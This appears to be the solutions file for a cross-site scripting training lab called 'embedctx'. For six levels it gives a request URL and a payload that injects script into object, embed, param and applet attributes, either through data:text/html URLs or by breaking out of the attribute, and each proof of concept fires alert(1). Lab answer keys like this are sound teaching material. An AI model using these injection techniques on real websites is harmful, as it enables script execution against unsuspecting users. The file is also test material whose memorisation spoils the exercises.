# embedctx — solutions

Reflections inside object/embed/param/applet attributes — break attribute or use data:text/html.

### embedctx-level1

`/embedctx/level1/?query=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `data:text/html,<script>alert(1)</script>`
- context: inside `<object data="...">`; data: URL loads attacker HTML

### embedctx-level2

`/embedctx/level2/?query=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `data:text/html,<script>alert(1)</script>`
- context: inside `<embed type="text/html" src="...">`; data: URL executes

### embedctx-level3

`/embedctx/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<param name="movie" value="...">` — break attribute

### embedctx-level4

`/embedctx/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<applet code="...">` — break attribute

### embedctx-level5

`/embedctx/level5/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: inside `<param name="src" value="...">` — break attribute

### embedctx-level6

`/embedctx/level6/?query=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `data:text/html,<script>alert(1)</script>`
- context: inside `<embed src="..." type="application/pdf">`; data: URL executes
